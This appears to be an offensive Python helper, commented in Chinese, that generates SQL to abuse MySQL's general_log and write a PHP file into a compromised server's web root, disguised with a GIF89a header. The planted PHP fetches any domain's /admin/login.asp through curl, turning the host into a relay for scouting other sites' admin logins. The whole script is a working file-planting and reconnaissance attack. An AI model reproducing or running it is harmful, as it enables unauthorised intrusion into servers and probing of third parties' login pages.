#!/usr/bin/env python3
"""gen_form_analyze.py - 生成form_analyze.php(81.70分析任意站登录表单)
?d=域名 → PHP curl GET /admin/login.asp → 输出字段+验证码路径
"""
body = '<?php $d=$_GET["d"];$ch=curl_init("http://".$d."/admin/login.asp");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_TIMEOUT,15);$r=curl_exec($ch);echo "LEN:".strlen($r)."|";$r2=strip_tags($r);echo $r2;?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/form_analyze.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/form_analyze.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
